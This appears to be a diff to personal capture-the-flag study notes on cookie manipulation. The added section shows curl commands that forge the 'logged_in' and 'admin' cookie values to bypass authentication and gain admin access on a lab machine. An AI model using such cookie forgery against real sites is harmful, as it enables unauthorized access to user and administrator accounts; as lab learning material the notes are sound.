@@ -124,6 +124,33 @@ What you can get from examining and editing the cookies :
     9- Cross-Site Scripting (XSS) Exploits: Using manipulated cookies to facilitate or exploit XSS vulnerabilities.
     10- Manipulating User Preferences or State: Changing cookies to influence user experience or application behaviour maliciously.
 
+After examining the cookie, we can do the following:
+
+
+	@@ Get Unauthenticated access:		
+		
+
+		curl http://MACHINE_IP/cookie-test
+
+		The result shows I am not logged to the machine
+
+
+		curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+
+		I am logged in as a user
+
+
+	@@ elevated privileges to admin
+
+		
+		curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+		
+		I am logged in as Admin ^-* 🎯
+
+
+
+
+		
 **Hashing
 
 Seems to be a random string of characters
